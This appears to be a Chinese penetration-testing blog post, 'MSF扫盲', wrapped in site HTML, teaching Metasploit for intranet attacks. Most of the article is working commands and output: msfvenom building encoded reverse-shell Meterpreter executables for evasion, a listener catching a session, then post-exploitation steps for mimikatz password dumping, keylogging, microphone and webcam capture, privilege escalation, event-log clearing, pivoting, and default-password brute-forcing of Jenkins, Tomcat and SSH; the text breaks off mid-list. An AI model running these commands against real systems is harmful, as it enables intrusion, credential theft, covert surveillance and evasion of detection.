@@ -1,0 +1,1403 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="MSF扫盲, 内网渗透 Python Windows API 钓鱼社工">
+    <meta name="baidu-site-verification" content="fmlEuI34ir">
+    <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
+    <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
+    <meta name="description" content="Metasplot Framework目录0x00 简介
+0x01 安装Metasploit(Windows和Linux)
+0x02 msfvenom
+0x03 监听
+0x04 Meterpreter命令
+0x05 路由
+0x06 内网扫描">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>MSF扫盲 | ske的博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    
+        <script>
+            (function(){
+                var bp = document.createElement('script');
+                var curProtocol = window.location.protocol.split(':')[0];
+                if (curProtocol === 'https') {
+                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+                }
+                else {
+                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                }
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(bp, s);
+            })();
+        </script>
+    
+
+    <script>
+        (function(){
+        var src = "https://jspassport.ssl.qhimg.com/11.0.1.js?d182b3f28525f2db83acfaaf6e696dba";
+        document.write('<script src="' + src + '" id="sozz"><\/script>');
+        })();
+    </script>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body>
+
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">ske的博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact" class="waves-effect waves-light">
+            
+            <i class="fa fa-comments"></i>
+            
+            <span>留言板</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">ske的博客</div>
+        <div class="logo-desc">
+            
+            内网渗透 | Python | Windows API | 钓鱼社工
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-comments"></i>
+                
+                留言板
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/SkewwG/hexo-matery-modified" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/SkewwG/hexo-matery-modified" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/MSFLiteracy/e1eb34c1-9110-414d-8c76-130ba3178359.png')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        MSF扫盲
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="container content">
+
+    
+    <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                        <a href="/tags/MSF扫盲/" target="_blank">
+                            <span class="chip bg-color">MSF扫盲</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                        <a href="/categories/MetasplotFramework/" class="post-category" target="_blank">
+                            MetasplotFramework
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-12-05
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
+                    
+                    ske
+                    
+                </div>
+
+                
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    15 分
+                </div>
+                
+                
+
+                
+                <div id="busuanzi_container_page_pv" class="info-break-policy">
+                    <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                    <span id="busuanzi_value_page_pv"></span>
+                </div>
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Metasplot-Framework"><a href="#Metasplot-Framework" class="headerlink" title="Metasplot Framework"></a>Metasplot Framework</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><pre><code>0x00 简介
+0x01 安装Metasploit(Windows和Linux)
+0x02 msfvenom
+0x03 监听
+0x04 Meterpreter命令
+0x05 路由
+0x06 内网扫描</code></pre><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>MetaSploit-Framework简介</p>
+<p>​&emsp;&emsp;Metasploit是一款开源的渗透测试框架平台，到目前为止，msf已经内置了数千个 已披露的漏洞相关的模块和渗透测试工具，模块使用ruby语言编写，这使得使用者 能够根据需要对模块进行适当修改，甚至是调用自己写的测试模块。选定需要使用 的攻击模块之后，你只需要使用简单的命令配置一些参数就能完成针对一个漏洞的 测试和利用，将渗透的过程自动化、简单化。</p>
+<p>相关术语</p>
+<pre><code>Exploit：攻击
+通过利用msf中的脚本对目标系统实施精准打击或漏洞验证
+Payload：攻击载荷
+攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码
+Listener：监听器
+生成木马之后发给受害主机，监听反弹木马连入本机</code></pre><h2 id="0x01-安装Metasploit"><a href="#0x01-安装Metasploit" class="headerlink" title="0x01 安装Metasploit"></a>0x01 安装Metasploit</h2><pre><code>Linux:
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \
+  chmod 755 msfinstall &amp;&amp; \
+  ./msfinstall
+
+
+Windows:
+访问：https://metasploit.help.rapid7.com/docs/installing-the-metasploit-framework
+下载地址：http://windows.metasploit.com/metasploitframework-latest.msi</code></pre><h3 id="0x01-1-windows下载安装"><a href="#0x01-1-windows下载安装" class="headerlink" title="0x01-1 windows下载安装"></a>0x01-1 windows下载安装</h3><pre><code>访问：https://metasploit.help.rapid7.com/docs/installing-the-metasploit-framework
+下载地址：http://windows.metasploit.com/metasploitframework-latest.msi</code></pre><p>运行metasploitframework-latest.msi，一路安装下去</p>
+<p>然后到C:\metasploit-framework\bin，运行msfconsole.bat</p>
+<p><img src="/img/MSFLiteracy/af72f89b-8854-4f38-8858-e88a6acdeb03.png" alt="img"></p>
+<p><img src="/img/MSFLiteracy/e1eb34c1-9110-414d-8c76-130ba3178359.png" alt="img"></p>
+<h3 id="0x01-2-Linux环境下载安装"><a href="#0x01-2-Linux环境下载安装" class="headerlink" title="0x01-2 Linux环境下载安装"></a>0x01-2 Linux环境下载安装</h3><pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \
+  chmod 755 msfinstall &amp;&amp; \
+  ./msfinstall</code></pre><p>输入命令msfconsole进入控制台</p>
+<p><img src="/img/MSFLiteracy/c73d7094-f29c-46a2-b14f-adde298e7992.jpg" alt="img"></p>
+<h2 id="0x02-msfvenom"><a href="#0x02-msfvenom" class="headerlink" title="0x02 msfvenom"></a>0x02 msfvenom</h2><p>metasploit-framework旗下的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）已然成为历史，取而代之的是msfvenom。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">Options:
+    -p, --payload    <span class="token operator">&lt;</span>payload<span class="token operator">></span>       指定需要使用的payload<span class="token punctuation">(</span>攻击荷载<span class="token punctuation">)</span>。如果需要使用自定义的payload，请使用<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#039;-&amp;#039;或者stdin指定</span>
+    -l, --list       <span class="token punctuation">[</span>module_type<span class="token punctuation">]</span>   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
+    -n, --nopsled    <span class="token operator">&lt;</span>length<span class="token operator">></span>        为payload预先指定一个NOP滑动长度
+    -f, --format     <span class="token operator">&lt;</span>format<span class="token operator">></span>        指定输出格式 <span class="token punctuation">(</span>使用 --help-formats 来获取msf支持的输出格式列表<span class="token punctuation">)</span>
+    -e, --encoder    <span class="token punctuation">[</span>encoder<span class="token punctuation">]</span>       指定需要使用的encoder（编码器）
+    -a, --arch       <span class="token operator">&lt;</span>architecture<span class="token operator">></span>  指定payload的目标架构
+        --platform   <span class="token operator">&lt;</span>platform<span class="token operator">></span>      指定payload的目标平台
+    -s, --space      <span class="token operator">&lt;</span>length<span class="token operator">></span>        设定有效攻击荷载的最大长度
+    -b, --bad-chars  <span class="token operator">&lt;</span>list<span class="token operator">></span>          设定规避字符集，比如: <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#039;\x00\xff&amp;#039;</span>
+    -i, --iterations <span class="token operator">&lt;</span>count<span class="token operator">></span>         指定payload的编码次数
+    -c, --add-code   <span class="token operator">&lt;</span>path<span class="token operator">></span>          指定一个附加的win32 shellcode文件
+    -x, --template   <span class="token operator">&lt;</span>path<span class="token operator">></span>          指定一个自定义的可执行文件作为模板
+    -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
+        --payload-options            列举payload的标准选项
+    -o, --out   <span class="token operator">&lt;</span>path<span class="token operator">></span>               保存payload
+    -v, --var-name <span class="token operator">&lt;</span>name<span class="token operator">></span>            指定一个自定义的变量，以确定输出格式
+        --shellest                   最小化生成payload
+    -h, --help                       查看帮助选项
+        --help-formats               查看msf支持的输出格式列表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="0x02-1-payloads"><a href="#0x02-1-payloads" class="headerlink" title="0x02-1 payloads"></a>0x02-1 payloads</h3><pre><code>msfvenom -l payloads                                                    列出payloads
+msfvenom -l payloads | grep windows/meterpreter                         筛选出windows系统的payloads
+msfvenom -p windows/meterpreter/reverse_tcp --payload-options           查看某个payloads的参数
+有windows，Linux，android等个平台的payload</code></pre><p><img src="/img/MSFLiteracy/eff99ff9-4e2b-4e67-b339-5cd68b78a80b.png" alt="img"></p>
+<p><img src="/img/MSFLiteracy/b2dd61b8-b3cc-410f-8053-1b4b800eb79f.jpg" alt="img"></p>
+<p><img src="/img/MSFLiteracy/42c4b4cd-1d72-46f4-9670-8896615ee69f.jpg" alt="img"></p>
+<h3 id="0x02-2-编码"><a href="#0x02-2-编码" class="headerlink" title="0x02-2 编码"></a>0x02-2 编码</h3><pre><code>msfvenom -l encoders
+常用的编码：
+cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
+x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</code></pre><p><img src="/img/MSFLiteracy/22aad99c-71c5-4ba3-84c4-00afe7d6c187.jpg" alt="img"></p>
+<h3 id="0x02-3-nops选项（空字段模块／一切为了绕过和免杀"><a href="#0x02-3-nops选项（空字段模块／一切为了绕过和免杀" class="headerlink" title="0x02-3 nops选项（空字段模块／一切为了绕过和免杀"></a>0x02-3 nops选项（空字段模块／一切为了绕过和免杀</h3><pre><code>msfvenom -l nops</code></pre><p><img src="/img/MSFLiteracy/dfb22d58-a4ec-497a-889a-ed3b9a85dc71.jpg" alt="img"></p>
+<h3 id="0x02-4-生成payload"><a href="#0x02-4-生成payload" class="headerlink" title="0x02-4 生成payload"></a>0x02-4 生成payload</h3><p><strong>msfvenom生成payload的常见格式为：</strong></p>
+<pre><code>msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</code></pre><p><strong>最简单型</strong></p>
+<pre><code>最简单型：
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.168.237 LPORT=4444 -f exe -o reverse_shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.168.237 LPORT=4444 -f exe -o reverse_shell.exe
+-p 指定payload，windows/meterpreter/reverse_tcp          是32位的windows系统反弹shell的payload
+               windows/x64/meterpreter/reverse_tcp      是64位的windows系统反弹shell的payload
+LHOST msf的IP
+LPORT msf监听的端口
+-f 生成的格式为exe
+-o 输出到本地名为reverse_shel.exe</code></pre><p><img src="/img/MSFLiteracy/b63a353d-c76f-4ab7-89cf-3aa80c362be9.jpg" alt="img"></p>
+<p><strong>编码处理型：</strong></p>
+<pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.168.237 -e x86/shikata_ga_nai -i 11 -f exe -o reverse_shell2.exe
+-a                      64或32位系统
+--platform windows      指定windows系统
+-e x86/shikata_ga_nai   编码格式
+-i 5                    编码次数
+X&gt;reverse_shell.exe     -f exe -o reverse_shell.exe</code></pre><p><img src="/img/MSFLiteracy/118f1232-a8b3-4aa0-812e-ea650de35f92.jpg" alt="img"></p>
+<h2 id="0x03-监听"><a href="#0x03-监听" class="headerlink" title="0x03 监听"></a>0x03 监听</h2><pre><code>msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set lhost 192.168.168.237
+lhost =&gt; 192.168.168.237
+msf5 exploit(multi/handler) &gt; set lport 5555
+lport =&gt; 5555
+msf5 exploit(multi/handler) &gt; exploit
+[*] Started reverse TCP handler on 192.168.168.237:5555 
+[*] Sending stage (179779 bytes) to 192.168.168.191
+[*] Meterpreter session 1 opened (192.168.168.237:5555 -&gt; 192.168.168.191:52691) at 2019-12-23 14:57:58 +0800
+meterpreter &gt; </code></pre><p><img src="/img/MSFLiteracy/ec107dc6-0fb1-47d0-af80-f1f4854c2fc6.jpg" alt="img"></p>
+<p>快速监听</p>
+<pre><code>handler -H 192.168.168.237 -P 5555 -p windows/meterpreter/reverse_tcp</code></pre><p><img src="/img/MSFLiteracy/c13152f7-2301-4cc9-8311-39433164d216.jpg" alt="img"></p>
+<h2 id="0x04-Meterpreter命令"><a href="#0x04-Meterpreter命令" class="headerlink" title="0x04 Meterpreter命令"></a>0x04 Meterpreter命令</h2><pre><code>查看有多少会话
+sessions -l
+连接会话
+sessions -i id
+查看会话命令
+meterpreter &gt; help
+查看进程
+meterpreter &gt; ps
+进程注入
+meterpreter &gt; migrate id
+vnc查看桌面
+meterpreter &gt; run vnc
+录音
+meterpreter &gt; record_mic -d 10
+开启摄像头
+meterpreter &gt; webcam_stream 
+屏幕截图
+meterpreter &gt; getdesktop
+系统信息
+meterpreter &gt; sysinfo
+取密码
+meterpreter &gt; load mimikatz      加载法国面包
+meterpreter &gt; msv                获取密码
+meterpreter &gt; kerberos           获取密码
+meterpreter &gt; clearev            清除日志
+截图
+meterpreter &gt; screenshot
+获取最高权限
+meterpreter &gt; getsystem
+进入目标机器shell
+meterpreter &gt; shell
+键盘记录
+meterpreter &gt; keyscan_start
+meterpreter &gt; keyscan_dump
+meterpreter &gt; keyscan_stop
+录音
+meterpreter &gt; record_mic -d 10
+打开摄像头
+meterpreter &gt; webcam_stream
+上传文件
+meterpreter &gt; upload /root/shellcode/1.txt c:\\windows\\temp\\
+下载文件
+meterpreter &gt; download c:\\windows\\temp\\2.txt /root/shellcode/
+
+Reboot      重启电脑
+Reg        修改注册表
+Shutdown    关闭电脑
+hashdump     下载hash</code></pre><p>查看会话，连接会话</p>
+<pre><code>sessions -l
+sessions -i id</code></pre><p><img src="/img/MSFLiteracy/d39da17b-821b-45d1-b1bc-3d9a5924afaa.jpg" alt="img"></p>
+<p>查看进程</p>
+<pre><code>ps</code></pre><p><img src="/img/MSFLiteracy/ddf71609-b6c0-462c-9e11-dd6673334b43.jpg" alt="img"></p>
+<p>进程注入</p>
+<pre><code>migrate pid</code></pre><p><img src="/img/MSFLiteracy/5c371968-ae7b-426a-b12d-95a214017005.jpg" alt="img"></p>
+<p><img src="/img/MSFLiteracy/6c246064-d073-4cfb-b5d0-eabcda95cac2.jpg" alt="img"></p>
+<p>vnc查看桌面</p>
+<pre><code>run vnc</code></pre><p><img src="/img/MSFLiteracy/21d4158c-d12f-4270-9794-4b6d228db630.jpg" alt="img"></p>
+<p>取密码</p>
+<pre><code>meterpreter &gt; load mimikatz      加载法国面包
+meterpreter &gt; msv                获取密码
+meterpreter &gt; kerberos           获取密码
+meterpreter &gt; clearev            清除日志</code></pre><p><img src="/img/MSFLiteracy/b183dc05-c535-4c22-b62a-be68eea63606.jpg" alt="img"></p>
+<p>系统信息</p>
+<pre><code>sysinfo</code></pre><p><img src="/img/MSFLiteracy/3cd1ab53-4122-4a71-930d-6a2fc0bef8a5.jpg" alt="img"></p>
+<p>截图</p>
+<pre><code>screenshot</code></pre><p><img src="/img/MSFLiteracy/c1385f73-57d8-42f2-9e4a-0318e745290c.jpg" alt="img"></p>
+<p>获取system权限</p>
+<pre><code>meterpreter &gt; getsystem</code></pre><p><img src="/img/MSFLiteracy/90fc0c25-c3a1-4f9b-b7d2-741e771a19a9.jpg" alt="img"></p>
+<p>键盘记录</p>
+<pre><code>keyscan_start
+keyscan_dump
+keyscan_stop</code></pre><p><img src="/img/MSFLiteracy/0eaf8513-1cc9-449d-87f9-67b0e1f01f45.jpg" alt="img"></p>
+<p>录音</p>
+<pre><code>apt-get install mplayer  
+record_mic -h
+record_mic -d 10
+mplayer xxx.wav </code></pre><p><img src="/img/MSFLiteracy/0b173e88-19e2-41d6-b144-2e8c59fc37c7.jpg" alt="img"></p>
+<p><img src="/img/MSFLiteracy/805db813-3b3e-4b28-b0b6-fe67ee15162f.jpg" alt="img"></p>
+<p>打开摄像头</p>
+<pre><code>webcam_stream</code></pre><p><img src="/img/MSFLiteracy/00e77eb2-3ec0-46a3-beff-7c3ce9895e68.jpg" alt="img"></p>
+<p>上传文件和下载文件</p>
+<pre><code>upload /root/shellcode/1.txt c:\\windows\\temp\\
+download c:\\windows\\temp\\2.txt /root/shellcode/</code></pre><p><img src="/img/MSFLiteracy/c59f1454-5a8b-43cb-a923-08e97e6881f3.jpg" alt="img"></p>
+<h2 id="0x05-路由"><a href="#0x05-路由" class="headerlink" title="0x05 路由"></a>0x05 路由</h2><pre><code>添加目标指定内网段路由的方式进行存活探测 
+    1-1、扫描10.10.101.0/24
+meterpreter &gt; run get_local_subnets 
+meterpreter &gt; run autoroute -s 10.10.101.0 -n 255.255.255.0 注意这个掩码,实战中要根据机目标机器上的掩码来的,不要闭着眼睛就直接给 0/24,不然有些机器可能会被漏掉 
+meterpreter &gt; run autoroute -p 路由添加完以后,习惯性的看下到底有没有加上
+【+】注意：此处案例是扫描其他段的时候，需要将路由也设置为其他段，例如：前面是扫描10.10.101段，现在要扫描10.10.102段，则路由设置为10.10.102段！
+    2-1、扫描10.10.102.0/24
+meterpreter &gt; run get_local_subnets 
+meterpreter &gt; run autoroute -s 10.10.102.0 -n 255.255.255.0 注意这个掩码,实战中要根据机目标机器上的掩码来的,不要闭着眼睛就直接给 0/24,不然有些机器可能会被漏掉 
+meterpreter &gt; run autoroute -p 路由添加完以后,习惯性的看下到底有没有加上
+【+】注意：此处案例是子网掩码为25,且rhost也设置为/25
+    3-1、扫描10.10.101.0/24
+meterpreter &gt; run get_local_subnets 
+meterpreter &gt; run autoroute -s 163.20.81.0 -n 255.255.255.128 注意这个掩码,实战中要根据机目标机器上的掩码来的,不要闭着眼睛就直接给 0/24,不然有些机器可能会被漏掉 
+meterpreter &gt; run autoroute -p 路由添加完以后,习惯性的看下到底有没有加上
+删除路由
+run autoroute -d -s 10.10.101.0/24</code></pre><p>添加路由</p>
+<p><img src="/img/MSFLiteracy/0fd018c2-3c96-4a31-a732-3c38c329f48f.jpg" alt="img"></p>
+<p>删除路由</p>
+<p><img src="/img/MSFLiteracy/4f9f62f4-5076-4834-b8f7-5facbeeedadd.jpg" alt="img"></p>
+<h2 id="0x06-内网扫描"><a href="#0x06-内网扫描" class="headerlink" title="0x06 内网扫描"></a>0x06 内网扫描</h2><pre><code>端口扫描
+use auxiliary/scanner/portscan/tcp
+msf5 auxiliary(scanner/portscan/tcp) &gt; set rhosts 192.168.168.0/24
+msf5 auxiliary(scanner/portscan/tcp) &gt; set ports 80
+msf5 auxiliary(scanner/portscan/tcp) &gt; set threads 100
+msf5 auxiliary(scanner/portscan/tcp) &gt; run
+ms17010漏洞扫描
+msf &gt; use auxiliary/scanner/smb/smb_ms17_010 
+msf &gt; set rhosts 192.168.1.0/24 
+msf &gt; set rport 445 
+msf &gt; set threads 3
+msf &gt; run 
+内网Jboss
+msf &gt; use auxiliary/scanner/http/jboss_vulnscan
+msf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65
+msf &gt; set threads 5
+msf &gt; set rport 8080
+msf &gt; set rport 80
+msf &gt; run
+内网Tomcat
+msf &gt; use auxiliary/admin/http/tomcat_administration [ 此模块只适合 tomcat 5.5 以下的版本,对于高版本,我们完全还有很多其它的替代品 ]
+msf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65
+msf &gt; set rport 8080
+msf &gt; set rport 80
+msf &gt; set threads 5
+msf &gt; set tomcat_user tomcat
+msf &gt; set tomcat_pass tomcat
+msf &gt; run
+内网 jenkins 默认登陆口弱口令
+msf &gt; use auxiliary/scanner/http/jenkins_login
+msf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65
+msf &gt; set rport 8080
+msf &gt; set rport 80
+msf &gt; set threads 5
+msf &gt; set username admin
+msf &gt; set password admin
+msf &gt; run
+内网批量 ssh 单口令探测
+msf &gt; use auxiliary/scanner/ssh/ssh_login
+msf &gt; set rhosts 172.16.41.3,1,2,26,23,24,25,21,22,48,95,252 172.16.40.1,2,16,17 172.16.14.99,152 
+msf &gt; set username admin
+msf &gt; set username root
+msf &gt; set password P@ssw0rd
+msf &gt; set threads 5
+msf &gt; run
+bash 远程执行 [getshell]
+msf &gt; use auxiliary/scanner/http/apache_mod_cgi_bash_env
